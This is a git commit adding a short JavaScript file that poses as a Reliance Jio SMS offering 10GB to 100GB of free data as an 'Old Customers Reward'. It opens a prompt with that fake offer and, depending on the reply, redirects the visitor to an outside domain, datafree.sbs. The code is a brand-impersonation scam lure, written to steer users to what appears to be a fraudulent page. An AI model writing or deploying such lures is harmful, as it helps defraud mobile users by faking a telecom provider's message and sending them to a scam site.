b2c94f0c12828ba5cfe731e2b699c5950a0d91e7
mmainomi <akparawa247@gmail.com>
2025-03-30 05:27:42 -0700

    Create activation-reliance-jio-freedata.js

---
+++ activation-reliance-jio-freedata.js
@@ -0,0 +1,5 @@
+var password = 'Free Data'
+password=prompt('RELIANCE JIO SMS: Dear customer, kindly check if your Reliance Jio sim card is qualify to receive from 10GB to 100GB data, Old Customers Reward, Press Free Data to Check Now ','Free Data');
+if (password != 'Free Data') {
+location.href='https://datafree.sbs/reliance-jio-freedata.html';
+}
